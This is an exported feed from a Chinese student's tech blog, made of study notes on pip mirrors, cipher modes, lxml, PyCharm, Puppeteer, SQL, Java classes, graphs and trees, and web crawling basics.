在工作环境中我们会集成开发环境去编码, 这里推荐JB公司的PyCharm, 而PyCharm也能很方便的和anaconda的虚拟环境结合 在Setting =&gt; Project =&gt; Project Interpreter 里面修改 Project Interpreter , 点击齿轮标志再点击Add Local为你某个环境的python.exe解释器就行了 15.长期更换pip镜像源 -i 阿里云 https://mirrors.aliyun.com/pypi/simple/ 电子科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 豆瓣(douban) http://pypi.douban.com/simple/ 清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/ 中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/修改源方法： 临时使用：可以在使用pip的时候在后面加上-i参数，指定pip源eg: pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple 永久修改：linux:修改 ~/.pip/pip.conf (没有就创建一个)， 内容如下： 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple windows:直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini，内容如下 12[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学笔记]]></title>
    <url>%2F2020%2F03%2F13%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[即使有安全的分组密码算法，也需要采用适当的工作模式来屏蔽明文的统计特性，数据格式等等，以提高整体的安全性，降低删除，重放插入和伪造成功的机会。美国NIST-SP800中定义了五种运行模式：电子码本ECB(Electronic Code-Book)，密码分组链接CBC(Cipher Block Chaining),计数器CTR(Counter),输出反馈OFB(Output Feedback)，密码反馈CFB(Cipher Feedback). 1.ECB,最简单的模式，直接利用加密算法各分组数据加密。明文分成64bit的分组进行加密，必要时填充。]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python lxml库中etree的简单应用]]></title>
    <url>%2F2020%2F03%2F13%2Fpython-lxml%E5%BA%93%E4%B8%ADetree%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.etree.HTML() 它可以用来解析字符串格式的HTML文档对象，将传进去的字符变成_Element对象，方便使用getparent(),remove(),xpath()等方法。 例如 12345678#encoding=utf8from lxml import etreehtml = &apos;&lt;html&gt;&lt;body&gt;&lt;h1&gt;This is a test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&apos;_element = etree.HTML(html)解析字符串格式的HTML对象text = _element.xpath(&apos;//h1/text()&apos;)etree.HTML方便利用xpath()等方法。print(&apos;result is :&apos;,text)得到result is:[&apos;This is a test&apos;]//可知xpath返回的只是列表，所以在使用此方法时，只获取第一个元素。 2.etree.tostring() 用于将_element对象转换成字符串。，通过简单的表达式无法得到结果时使用。 1&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;This &lt;a&gt;is a &lt;/a&gt;test&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 若用”//h1/text()”得到”This”和”test”,用”//h1//text()得到”This”” is a “”test”,etree方法可以传递多个参数，element_or_tree,encoding,method.可以将列表拼接成字符串。 1result = etree.tostring(_h[0],method=&apos;text&apos;)method为text时，表示返回_element对象中的所有文本。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pycharm使用时遇到的问题]]></title>
    <url>%2F2020%2F03%2F13%2Fpycharm%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1.cmd中查看python安装了哪些第三方库命令：pip list。 2.手动下载python第三方库：在网站下载后缀为.whl的文件，并且将下载的文件放入C:user/xxx/文件夹中，利用cmd执行pip install 下载的文件名。 3.想安装lxml库学习爬虫&gt;cnoda放弃&gt;手动安装lxml，下好了whl文件pip出现问题&gt;下载的版本不对&gt;查询支持哪些版本&gt;查询版本命令出错&gt;，最后结果是删除了原有的几个python project，重建了一个project勾选了Inherit global site-packages/Make available to all projects。 4.Xpath，在源码中相当于定位地址。 //*[@id=”mainBox”]/main/div[2]/div[1]/h4/a //指根结点，/指往下层寻找，/text()指提取文本内容，/@xxxx指提取属性内容。 5.记住Linux下安装任何软件，找教程都要附上Linux的版本，是Centos还是Ubuntu。 6.python3.7卸载出问题了，找到C盘下&gt;用户&gt;Lenovo&gt;appdata&gt;local&gt;programs,将python文件夹删除后，在添加与删除程序界面repair后可正常卸载。 7.pip 是一个安装和管理 Python 包的工具 , 是 easy_install 的一个替换品。 许多人在第一次使用pip的时候都会出现’pip’ 不是内部或外部命令，也不是可运行的程序或批处理文件。 这是因为直接在Administrator目录下面直接执行pip命令的时候 会在这个目录下面找pip的可执行文件。 而pip是在python目录下面的scripts目录下面的 所以就出现了上面的错误。 python37下可能无pip.exe，python -m ensurepip解决。在我的电脑属性&gt;高级系统设置中配置环境变量。 8.python的第三方库，pip，requests等，可直接在settings&gt;projectxxx&gt;project interpreter中升级。 9.国内镜像源升级pippython -m pip install –upgrade pip -i https://pypi.douban.com/simple。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2020/3/12]]></title>
    <url>%2F2020%2F03%2F12%2Fpuppeteer%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Puppeteer入门 0.Node的安装，在windows下应该没啥问题。今天在centos上试了下，掌握得并不是很好。 在官网下载，一种是源码安装，下载之后编译。另一种是直接解压。 1tar xf node-v12.16.1-linux-x64.tar.xz 但是之后要在全局使用node命令，就要在系统环境变量里面把路径加进去。Windows是明白了，但是Linux没想到。Centos中系统环境变量在 1/etc/profile 目录下。 其实和给npm与node建立软链接是一个作用。 ln -s node的路径 /usr/bin，npm类似。 遇到如下报错，原因是缺少package.json文件，需要执行 npm init 123456npm WARN saveError ENOENT: no such file or directory, open &apos;/package.json&apos;npm WARN enoent ENOENT: no such file or directory, open &apos;/package.json&apos;npm WARN !invalid#1 No descriptionnpm WARN !invalid#1 No repository field.npm WARN !invalid#1 No README datanpm WARN !invalid#1 No license field. 1.找到一篇博客写的很清楚，正常来说执行 1npm install puppeteer --save 但是因为chromium下载不了，那就 1npm install puppeteer --ignore-scripts --save 然后自己下一个chromium（）要对应版本的，在puppeteer的package.json中查看。最后用FTP传到服务器里去。 2.[学长的博客]https://brickyang.github.io/2019/01/14/%E5%9B%BD%E5%86%85%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85-Puppeteer-%E7%9A%84%E6%96%B9%E6%B3%95/方法一二都试过，但是道行太浅，看不懂应该如何用脚本。从下午四点搞到七点多才做好，方法论引人深思。用淘宝的镜像源装好puppeteer。 3. 4.examples pdf： 123456789101112131415const puppeteer = require(&apos;puppeteer&apos;);(async() =&gt; &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(&apos;https://news.ycombinator.com&apos;, &#123;waitUntil: &apos;networkidle2&apos;&#125;); // page.pdf() is currently supported only in headless mode. // @see https://bugs.chromium.org/p/chromium/issues/detail?id=753118 await page.pdf(&#123; path: &apos;hn.pdf&apos;, format: &apos;letter&apos; &#125;); await browser.close();&#125;)(); screenshot： 123456789const puppeteer = require(&apos;puppeteer&apos;);(async() =&gt; &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(&apos;http://example.com&apos;); await page.screenshot(&#123;path: &apos;example.png&apos;&#125;); await browser.close();&#125;)(); 5.总结，对于别人给的命令不能照搬，特别是有路径啥的时候，自己去按照本身情况改。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQL]]></title>
    <url>%2F2019%2F11%2F25%2FSQL%2F</url>
    <content type="text"><![CDATA[一：去掉重复数据的方法 1.distinct 根据单个字段去重，能够精确去重。但作用在多个字段时，只有当这几个字段完全相同才能去重。（要保证每一列都一样）。count(distinct 重复数据所在字段)会返回不重复的条数。 2.group by 在语句最后加上group by+重复数据所在字段。 二：group by的用法 group by必须配合聚合函数用，分组之后可以计数count，求和sum，求平均数avg，max和min等。group by不会将所有信息显示出来，只能得到所需的特定数值。 提到group by就不得不提到HAVING，它与WHERE筛选不同(where是聚合前的筛选，having是聚合后的筛选)，HAVING是对于group by对象进行筛选。它可以用来筛选group by之后的数值符合条件的部分。 GROUP BY 子句:指定用来放置输出行的组。指定 GROUP BY 时，选择列表中任一非聚合表达式内的所有列都应包含在 GROUP BY 列表中，或者 GROUP BY 表达式必须与选择列表表达式完全匹配。如果 SELECT 子句中包含聚合函数，则计算每组的汇总值。 group by语句后接上多个参数时，为了去重需要用where语句进行去重。使用count并重命名的列不用加在group by里。 order by xxx按照xxx排列，desc为降序 三：limit用法 select * from tableName limit i,n tableName：表名 i：为查询结果的索引值(默认从0开始)，当i=0时可省略i n：为查询结果返回的数量 i与n之间使用英文逗号”,”隔开 limit n 等同于 limit 0,n 四：datediff函数 select datediff(year，birthday，gatdate()) 五：模糊查询 select * from XXX where (XXX like ‘%XX’) 六：排序 desc为从高到低 七：left join LEFT JOIN 关键字会从左表 (table_name1) 那里返回所有的行，即使在右表 (table_name2) 中没有匹配的行。 用法如下: 12345&gt; SELECT column_name(s)&gt; FROM table_name1&gt; LEFT JOIN table_name2 &gt; ON table_name1.column_name=table_name2.column_nam&gt; 八：如果是表名或者列名之类的属性，不用加引号。如果是列中的值，或者输入的值，则必须加引号。 九：多表查询 对于n张表，依靠n-1个字段联结的，在select语句中，对要求的多个列名进行查询(作为联结的列名要写出所属表名)，再用where语句对其进行去重，如：学生.学号=选修.学号。 十：子查询返回的值不止一个。当子查询跟随在 =、!=、&lt;、&lt;=、&gt;、&gt;= 之后，或子查询用作表达式时，这种情况是不允许的。这种情况不能在语句中使用等号，要用in select * from 学生where 学生.班号 in (select 班级.班号 from 班级 where (班级.专业编号=’001’)) 子查询就是把一个查询的结果在另一个查询中使用。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java review]]></title>
    <url>%2F2019%2F11%2F23%2FJava-review%2F</url>
    <content type="text"><![CDATA[[TOC] 类的定义在 Java 中定义一个类，需要使用 class 关键字、一个自定义的类名和一对表示程序体的大括号。完整语法如下： 123456789101112&gt; [public][abstract|final]class&lt;class_name&gt;[extends&lt;class_name&gt;][implements&lt;interface_name&gt;] &#123;&gt; // 定义属性部分&gt; &lt;property_type&gt;&lt;property1&gt;;&gt; &lt;property_type&gt;&lt;property2&gt;;&gt; &lt;property_type&gt;&lt;property3&gt;;&gt; …&gt; // 定义方法部分&gt; function1();&gt; function2();&gt; function3();&gt; …&gt; public：表示“共有”的意思。如果使用 public 修饰，则可以被其他类和程序访问。每个 Java 程序的主类都必须是 public 类，作为公共工具供其他类和程序使用的类应定义为 public 类。 abstract：如果类被 abstract 修饰，则该类为抽象类，抽象类不能被实例化，但抽象类中可以有抽象方法（使用 abstract 修饰的方法）和具体方法（没有使用 abstract 修饰的方法）。继承该抽象类的所有子类都必须实现该抽象类中的所有抽象方法（除非子类也是抽象类）。 final：如果类被 final 修饰，则不允许被继承。 class：声明类的关键字。 class_name：类的名称。 extends：表示继承其他类。 implements：表示实现某些接口。 property_type：表示成员变量的类型。 property：表示成员变量名称。 function()：表示成员方法名称。 创建一个新的类，就是创建一个新的数据类型。实例化一个类，就是得到类的一个对象。因此，对象就是一组变量和相关方法的集合，其中变量表明对象的状态和属性，方法表明对象所具有的行为。 (1) 声明类。编写类的最外层框架。 (2) 编写类的属性。类中的数据和方法统称为类成员。其中，类的属性就是类的数据成员。通过在类的主体中定义变量来描述类所具有的特征（属性），这里声明的变量称为类的成员变量。 (3) 编写类的方法。类的方法描述了类所具有的行为，是类的方法成员。可以简单地把方法理解为独立完成某个功能的单元模块。 类的属性:成员变量的定义和声明声明成员变量的语法如下： 12&gt; [public|protected|private][static][final]&lt;type&gt;&lt;variable_name&gt;&gt; 各参数的含义如下。 public、protected、private：用于表示成员变量的访问权限。 static：表示该成员变量为类变量，也称为静态变量。 final：表示将该成员变量声明为常量，其值无法更改。 type：表示变量的类型。 variable_name：表示变量名称。 可以在声明成员变量的同时对其进行初始化，如果声明成员变量时没有对其初始化，则系统会使用默认值初始化成员变量。 实例化，就是对一个对象的各个属性进行赋值的过程。 成员方法声明成员方法可以定义类的行为，行为表示一个对象能够做的事情或者能够从一个对象取得的信息。类的各种功能操作都是通过方法来实现的，属性不过提供了相应的数据。一个完整的方法通常包括方法名称，方法主体，方法参数和方法返回值类型。格式如下： 12345public class Test &#123; [public|private|protected][static]&lt;void|return_type&gt;&lt;method_name&gt;([paramList]) &#123; // 方法体 &#125;&#125; public、private、protected：表示成员方法的访问权限。 static：表示限定该成员方法为静态方法。 final：表示限定该成员方法不能被重写或重载。 abstract：表示限定该成员方法为抽象方法。抽象方法不提供具体的实现，并且所属类型必须为抽象类。 This关键字this.属性名大部分时候，普通方法访问其他方法，成员变量时无需使用this前缀，但是如果方法中有局部变量和成员变量同名，程序又要在该方法里访问这个被覆盖的成员变量，则必须使用this前缀。(我的理解是，传的参数名字与定义的变量名字相同时，为了区分变量与参数，使用this)。 例如定义一个Teacher： 12345public class Teacher &#123; private String name; // 教师名称 private double salary; // 工资 private int age; // 年龄&#125; 上述代码中，三个变量名的作用域是private，因此在类外部无法对其中的变量进行赋值。为了解决这个问题，为Teacher类构造一个方法，然后在该方法中进行传参，赋值。但是问题来了，成员变量名和局部变量名(参数)相同，赋值不了。此时给成员变量名加上this的前缀进行区分。 123456// 创建构造方法，为上面的3个属性赋初始值public Teacher(String name,double salary,int age) &#123; this.name = name; // 设置教师名称 this.salary = salary; // 设置教师工资 this.age = age; // 设置教师年龄&#125; 当一个类的属性（成员变量）名与访问该属性的方法参数名相同时，则需要使用 this 关键字来访问类中的属性，以区分类的属性和方法中的参数。 this.方法名this 可以代表任何对象，当 this 出现在某个方法体中时，它所代表的对象是不确定的，但它的类型是确定的，它所代表的只能是当前类的实例。只有当这个方法被调用时，它所代表的对象才被确定下来，谁在调用这个方法，this 就代表谁。 对象是一个确定的存在 12345678910/** * 第二种定义Dog类方法 **/// 定义一个run()方法，run()方法需要借助jump()方法public void run() &#123; // 使用this引用调用run()方法的对象 this.jump(); System.out.println(&quot;正在执行run方法&quot;);&#125; 在现实世界里，对象的一个方法依赖于另一个方法的情形很常见，例如，吃饭方法依赖于拿筷子方法，写程序方法依赖于敲键盘方法。这种依赖都是同一个对象两个方法之间的依赖。因此，Java 允许对象的一个成员直接调用另一个成员，可以省略 this 前缀。也就是说，将上面的 run( ) 方法改为如下形式也完全正确。 1234public void run() &#123; jump(); System.out.println(&quot;正在执行run方法&quot;);&#125; 注意：对于 static 修饰的方法而言，可以使用类来直接调用该方法，如果在 static 修饰的方法中使用 this 关键字，则这个关键字就无法指向合适的对象。所以，static 修饰的方法中不能使用 this 引用。并且 Java 语法规定，静态成员不能直接访问非静态成员。 setter方法和getter方法： 出于封装考虑，某些class的成员变量通常都声明为private变量，无法直接访问此对象的private属性，通常的做法就是：为private的成员变量声明public的访问接口，称为setter方法与getter方法。 setter： 命名方法：set+变量名，such as setName/setScore；setter方法用于赋值，返回类型都为void getter： 命名方法：get+变量名，such as getName/getScore ；getter方法用于取值，无需输入参数，但是返回类型一定是该成员变量的数据类型。]]></content>
  </entry>
  <entry>
    <title><![CDATA[图]]></title>
    <url>%2F2019%2F11%2F21%2F%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[图的基本概念 顶点(vertex)：数据元素。类似于在线性表中：元素；树中：结点； 图(Graph)：由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为G(V,E),G表示图，V表示顶点的集合，E表示边(edge)的集合。 子图(Subgraph)：B图的顶点和边都属于A图，则B图是A图的子图。 边：顶点Vi到顶点Vj之间的连线没有方向，则称这条连线为边。用小括号(Vi,Vj)或(Vj,Vi)表示。若有方向，则称之为弧(Arc)，用&lt;Vi,Vj&gt;表示。其中Vi是弧尾，Vj是弧头。箭头即弧头。 图中顶点之间的连线全是没有方向的边，则称之为无向图(Undirected graphs).顶点全是有方向的弧，则将该种图称之为有向图(Directed graphs)。 简单图：不存在顶点到其自身的连线，并且同一条连线不重复出现。 对于无向图： 邻接点：与该结点存在边相关联的点称之为邻接点。顶点的度就是与该顶点相关联的边的数目。 对于有向图： 存在弧&lt;Vi,Vj&gt;,则称顶点Vi邻接到Vj，以该顶点为头的弧的数目称为该顶点的入度(Indegree)，反之称之为出度(Outdegree)。 路径：从一个点到另一个点所经过的顶点序列。路径长度：路径上的边或者弧的数目。 回路或环：路径中出发点和终止点为同一点。 简单回路或简单环：路径中出发点与终止点为同一点，而其他顶点互不相同。 简单路径：所有顶点都不相同。 连通图：从顶点Vi到顶点Vj存在路径，则称Vi到Vj是连通的。如果图中任意两个顶点都是连通的，则称其为连通图(Connected Graph)。 连通分量：极大连通子图。 强连通图：从Vi到Vj，以及从Vj到Vi，都存在路径，则称该图为强连通图。 生成树：连接n个结点的n-1条边形成的所极小连通子图。有向图中的极大强连通子图称为有向图的强连通分量。有向图中若干棵有向树连接n个结点，且总共有n-1条弧，构成了生成森林。 无向图中，如果任意两个顶点之间都存在边，则称该图为无向完全图。有向图中，任意两个顶点之间都存在互为相反的两条弧，则称该图为有向完全图。 不管是有向图还是无向图，边/弧比较少时，称之为稀疏图，反之称之为稠密图。 权(Weight)：实际应用时，图的边/弧往往映射为现实中某个具体的信息，附带相关的数字值，这种与图的边/弧相关联的数字的值称之为权。带权的图称之为网(Network)。 图的存储结构邻接矩阵表示法：将顶点与边/弧分别用两个结构来进行存储，并且从中建立关联。邻接矩阵表示法用两个数组来表示图，一个一维数组用于存储图中的顶点信息(存储顺序体现出结点的编号顺序)，一个二维数组(称之为邻接矩阵)用于存储图中边/弧的信息。 arc=①1，若该边/弧存在。②0，反之。 易知，无向图的边数组其实是一个基于主对角线的对称矩阵，编号为i的顶点的度，等于第i行或i列中非0元的个数。有向图的弧数组不再是对称矩阵，而且第i行的非0元个数表示编号为i的顶点的出度，第i列的非0元个数表示编号为i的顶点的入度，整个矩阵的非0元个数等于弧的总数。 使矩阵能够表示出带权值的网，可将权值代替原矩阵中的1. 12345678图的邻接矩阵存储结构#define maxvex 100typedef struct&#123;char vexs[maxvex];int arc[maxvex][maxvex];int vertex,edges;&#125;MGraph; 邻接表表示法：第一部分，用一个一维数组来存储所有顶点的值。第二部分，多个单链表。将该结点(一维数组中的元素)弧尾对应的弧头存储在链表中的data域。 无向图的表示方法与有向图几乎完全相同，但是单链表结点数翻倍(一条边视为两条弧)。对于带权值的网，可以在链表中加入一个存放权值的域。 邻接表的优点在于根据实际的边/弧数目动态确定存储结构(多个单链表)，避免了存储空间的浪费。有向图中很容易确定该顶点的出度(求出单链表表长)，无向图中表长就是顶点的出度。缺点在于在有向图中要获取顶点i的入度非常麻烦，需要遍历出链表中有多少链表中data域为i。 于是出现逆邻接表表示方法：将链表中的data域存放指向当前顶点的弧的弧尾编号。这样获取入度非常简单(同时获取出度很难)。 十字链表表示方法：略。 图的遍历Traversing Graph深度优先遍历(Depth_First_Search,DFS)很难用言语表达清楚，你懂的，类似于树的先序遍历。先一条道走到黑，再一步一步往回走看是否有别的路径。因为可能存在多个符合条件的邻接点，所以图的深度优先遍历序列是不唯一的。 广度优先遍历(Breadth First Search，BFS)①访问任意一个顶点。②访问该顶点所有的邻接点。③访问该顶点的所有邻接点的所有邻接点。④…… 找出当前邻接点的所有外一层邻接点，后按任意序列进行遍历。 最小生成树n个顶点，用n-1条边把一个连通图连接起来，并使得权值之和最小。有Prim算法与Kruskal算法。注意最小生成树与遍历是不一样的，寻找最小生成树时，不要求上一步与下一步之间连续。 Prim算法：观察符合条件的那些边，(边的一个端点是灰色，另一个端点是白色)，并选出其中权值最小的一条。与边数目无关，只与顶点个数有关，适用于稠密图。(稀疏图亦可)。 Kruskal算法：一句话，”不构成环的情况下，选权值最小的边。“与边数目有关，与顶点个数无关，适用于稀疏图。 AOV网：用顶点表示活动，弧表示活动的优先关系的有向图称为AOV网。弧表示活动之间的某种固有的制约关系。 拓扑序列：假设活动Vi是活动Vj的前驱活动，则在顶点序列中顶点Vi必定在顶点Vj的前面。满足这样的条件，则称这样的顶点序列为一个拓扑序列。 拓扑排序：构造拓扑序列的过程。 拓扑排序的方法：每次从AOV网中选择一个入度为0的顶点，输出，然后删去此顶点及所有与他相关的弧。重复上述操作直到，输出全部的顶点，或者AOV网中找不到入度为0的顶点。 AOE网：弧表示每个步骤环节的活动，顶点表示步骤环节开始时或者结束时的状态，权值表示该活动进行所需要的时间，构成的弧表示活动的有向无环图称为AOE网。主要用于解决时间上的一些相关问题。此处常用到顶点i最早呈现时间ve(i),顶点i最晚呈现时间vl(i)。 由于在AOE网中，活动可以并行地进行，所以完成工程的最短时间是从始点到终点的最长路径的最短长度(权值之和)。路径长度最长的路径叫做关键路径。最长路径并不追求最长，反而是保证所有活动完成的最短。 ve(i)等于从出发点到当前点i的最长路径的长度(满足所有状态而非一个状态)。 vl(i)等于总工期与从当前点到终点的最长路径的差值(后面都是理想状态，预留给前面的最多时间)。 ve(i)=vl(i)，顶点i称为关键点，该活动称为关键活动。 最短路径：指的是两个顶点之间经过的边/弧上权值最小的路径。 具体操作： 三行表，i为给顶点的序号，D[i]表示权值，最后一行为路径。 初始化将源点可到的顶点的权值写下。 ①将落脚点标灰（D[i]最小的点） ②修正邻接落脚点的点的路径与D[i]]]></content>
      <tags>
        <tag>Data Structure</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tree]]></title>
    <url>%2F2019%2F11%2F17%2FTree%2F</url>
    <content type="text"><![CDATA[[TOC] 树(tree)一：树的相关基本概念： 树是n个节点的有限集(n&gt;=0)，当n=1时，该元素就称为树的根节点，当n&gt;1时，其他节点可分为m个非空且不相交的有限集称为子树(SubTree)。 树的节点包含一个数据元素以及若干指向子树的分支，节点拥有的子树个数称为节点的度(Degree),度为0的节点称为叶子(Leaf)或终端节点，度不为零的节点称为非终端节点/分支节点。 一棵树中各个节点的度的最大值称为该树的度。 节点(双亲节点)的子树的根节点，称为该节点的孩子节点。同一个双亲节点的孩子节点之间互称兄弟(Sibling),双亲节点不相同但处于同一层的互称堂兄弟。 在一棵树中，每个节点都有自己的层次(度表示的是另一个维度)，层次的顺序为：根节点位于1层，树中节点的层次的最大值称为树的深度(Depth)或高度。 在一棵树中，同层的孩子节点左右互换会发生变化，则该树称为有序树，反之称为无序树。 树的几个基本特征：一棵由n个节点组成的树，其边的数目为n-1。如果一个实际问题在建模时无法用一棵树表达，而必须采用多棵互不相交的树来表示，那么这些多棵互不相交的树称为森林。 树的存储结构表示：双亲表示法，孩子表示法，孩子兄弟表示法。(树的存储，关键在于存储数据元素与数据元素之间的关系)。 双亲表示法：假设以一组连续的空间来存储树的所有节点的值，同时在每个节点中设置一个域指示双亲节点在本连续空间中的下标位置。这种存储结构利用了树结构中每个节点(除根节点外)都只有唯一的双亲的性质，用一维数组来存放树的所有节点，并设置parent域，建立节点与双亲的一一映射。具体实施时，注意是数组的下标分别给节点编号，节点并不一定是从根节点开始编的，可能是随机的。parent域即存放双亲节点的数组下标，根节点的parent域存放-1.这种方法无法存放有序树，并且受数组长度的限制。 孩子表示法：把每个节点的孩子节点排列起来，看成一个线性表，并且以单链表存储，则n个节点具有n个孩子链表(叶子节点的孩子链表为空表)，而n个头指针又组成一个线性表。通俗地来说，就是先用一维数组把所有节点进行一次编号，child域指向其中一个孩子节点的数组下标编号，该孩子节点的child域再指向下一个孩子节点的数组下标编号(同层次)。可以表示有序树，但难以确定一个节点的层次，树节点个数同样受数组长度的限制。 二：二叉树 二叉树(Binary Tree)，其特点是每个节点最多有两棵子树，并且有左右之分(有序树)。 在二叉树的第K层上，至多有2^(k-1)个节点。深度为K的二叉树至多有2^k-1个节点。 对于任意一棵二叉树，如果其终端节点数为n0，度为2的节点数为n2，则有n0=n2+1. 先序遍历，中序遍历，后序遍历关键在于根节点的访问顺序不同，遍历的时候要假设两棵子树都存在，要遍历则从最低端的叶子开始。 满二叉树：每一层的节点个数达到最大。 完全二叉树：除了最下面一层叶子节点之外，其他各层节点数达到最大值。并且最后一层叶子节点按照从左到右的顺序连续存在，只缺最后一层若干节点。 三：线索二叉树一般的二叉链表只能找到左右孩子，找不到前驱，后继节点。充分利用二叉链表的空指针，使得在遍历过程中能找到各个节点的先驱后继。线索化就是在遍历中完成对叶子节点的指针添加的过程。指向节点前驱和后继的指针叫做线索，线索二叉树某个节点中的域分别为Lchild,LTag,data,RTag,Rchild.Tag为0表示Lchild/Rchild指孩子，反之指前驱后继节点。 线索树的画法：给出前序遍历序列和中序遍历序列，要求画后序线索树。首先把后序遍历序列写出，之后查看每个节点的左右两边是否有节点。如果左边没有节点，则用虚线指向，后序遍历序列中该节点的左边一个元素。如果右边没有节点，则用虚线指向，后序遍历序列中，该节点右边的一个元素。 四：哈夫曼树(Huffman) 路径长度：从树中一个节点到另一个节点之间的分支构成的路径，分支数目称为路径长度。 树的路径长度：从树根到每一个节点的路径长度之和。 树的带权路径长度：树中所有叶子节点的带权路径长度和。WPL=WkLk从k=1到k=n的求和。对于节点个数相同的树，完全二叉树是路径长度最短的树。 最优二叉树(哈夫曼树)：有n个权值{W1,W2,……，Wn}构造一棵有n个叶子节点的二叉树，每个叶子节点带一个权值，则其中带权路径长度WPL最小的二叉树称为最优二叉树。WPL的计算，通俗地来说就是权值乘以（路径上节点的个数-1）。构造步骤，给出了一组权值，选择两个最小的权值作为子树，根节点的权值为两子树权值之和。注意当根节点的权值小于两最小权值之和时，需要再建立一棵子树。这时选出的两个数字都不是已经构造好的二叉树里面的节点，所以要另外开一棵二叉树。如果两个数的和正好是下一步的两个最小数的其中的一个，那么这个树直接往上生长就可以了，如果这两个数的和比较大，不是下一步的两个最小数的其中一个，那么就并列生长。(构造哈夫曼树常见误区) 哈夫曼编码：利用哈夫曼树求得的用于通信的二进制编码称为哈夫曼编码。树中从根到每个叶子节点都有一条路径，对路径上的各分支约定指向左子树的分支表示”0”码，指向右子树的分支表示”1”码，取每条路径上的”0”或”1”的序列作为各个叶子节点对应的字符编码，即是哈夫曼编码。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫]]></title>
    <url>%2F2019%2F09%2F20%2FPython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[在大学计算机专业、理工类专业大多学习，C/C++，Java这些开发语言，Android, iOS也有不少同学买书或下载视频学习，但是最后都是没有结果。 把编程开发学习当作一个技能来学习，而不是大学中的学习。中学、大学的学习目标是为了考试，完成学分。了解习得性的技能学习的规律。即强化训练，反复训练。没有一定强度的反复操练是不可能掌握一门技能。 完成代码量的训练，如果要定一个量的话是10000行。 你可以想一想大学里学C, C++, C#写了多少代码？很多同学是不超过200行。 一定要做项目。每天完成一些练习、Demo，还不够。把这个项目当作你独立的作品来完成。 每天写日志、写总结。用markdown、博客来写，记录你学习过程中的问题、思路和成就。 基础知识：网络爬虫，是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。 搜索引擎工作原理 第一步：抓取网页(spider) 搜索引擎通过特定规律抓取网页，这种特殊规律体现在Robots协议(网络爬虫排除标准)中，网站通过Robot协议告诉搜索引擎哪些页面可以被抓取，哪些不能。查看Robots协议的方法是在网址后加上”/robots.txt” 第二步：数据存储 搜索引擎通过spider跟踪链接爬行到网页，并将爬行的数据存入原始页面数据库。 第三步：预处理 搜索引擎将蜘蛛抓取回来的页面，进行各种步骤的预处理。如⒈提取文字 ⒉中文分词 ⒊去停止词 ⒋消除噪音（搜索引擎需要识别并消除这些噪声，比如版权声明文字、导航条、广告等……） 5.正向索引 6.倒排索引 7.链接关系计算 8.特殊文件处理。除了HTML文件外，搜索引擎通常还能抓取和索引以文字为基础的多种文件类型，如 PDF、Word、WPS、XLS、PPT、TXT 文件等。 第四步：排名，提供检索服务 聚焦爬虫与通用爬虫 聚焦爬虫是一个自动下载网页的程序，它根据既定的抓取目标，有选择的访问万维网上的网页与相关的链接，获取所需要的信息。与通用爬虫(general purpose web crawler)不同，聚焦爬虫并不追求大的覆盖，而将目标定为抓取与某一特定主题内容相关的网页，为面向主题的用户查询准备数据资源。 基本原理爬虫是 模拟用户在浏览器或者某个应用上的操作，把操作的过程、实现自动化的程序。 输入url对服务器发起请求后，简单来说将经历四个步骤： 查找域名对应的IP地址 向IP对应的服务器发出请求 服务器响应请求，发回网页内容 浏览器解析网页内容 网络爬虫本质上就是浏览器的http请求，浏览器与爬虫都通过相同的方式来获取网页，但是网络爬虫所做的相当于将浏览器的功能批量执行，通过指定url直接返回符合查找规律的数据，而不用用户人工获取。 HTTP协议：即超文本传输协议，是一种发布和接受超文本链接HTML的方法。 HTTP协议基于TCP协议，TCP/IP协议参考模型如上。http为应用层的协议，默认其端口号为80，https的端口号是443. http操作的具体过程： 地址解析：从url中分离出协议名，主机名，端口，对象路径等部分,域名系统DNS解析域名也是在这一步。 封装HTTP请求包：将以上部分结合本机信息(IP等)，封装成一个HTTP请求包， 封装成TCP包，建立TCP连接（三次握手）：HTTP协议是比TCP更高级的应用层协议，根据规则，只有低层协议建立之后，才能进行更高层协议的连接，所以在HTTP开始工作之前，客户机的web浏览器首先通过网络与服务器通过TCP协议建立连接。一般TCP连接的端口号是80，但在这是8080. 客户机发送请求命令：建立连接后，客户机发送http请求请求给服务器，(具体操作，请求的格式，状态码，get/post在此处不深究。) 服务器相应：服务器接到请求后，给予相应的http相应。 服务器关闭TCP连接：一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接。 HTTPS（全称：Hypertext Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL。其所用的端口号是443。 